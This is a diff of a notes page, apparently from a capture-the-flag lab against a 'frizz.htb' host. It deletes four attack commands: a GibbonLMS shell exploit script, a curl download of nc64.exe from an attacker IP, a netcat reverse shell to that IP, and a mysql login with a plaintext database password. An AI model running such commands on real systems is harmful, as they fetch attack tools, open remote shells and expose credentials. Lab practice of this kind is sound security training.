@@ -1,19 +1,31 @@
 [[Editing Copy Page]]
 
 ```
-python3 gibbonlms_cmd_shell.py http://frizzdc.frizz.htb/
+
 ```
 
 ```
-curl 10.10.17.95/nc64.exe -o nc64.exe
+
 ```
 
 ```
-.\nc64.exe -nv 10.10.17.95 389 -e cmd
+
 ```
 
 ```
-mysql.exe -uMrGibbonsDB -p"MisterGibbs!Parrot!?1" gibbon -e "show TABLES;DESCRIBE gibbonperson;"
+
+```
+
+```
+
+```
+
+```
+
+```
+
+```
+
 ```
 
 ```
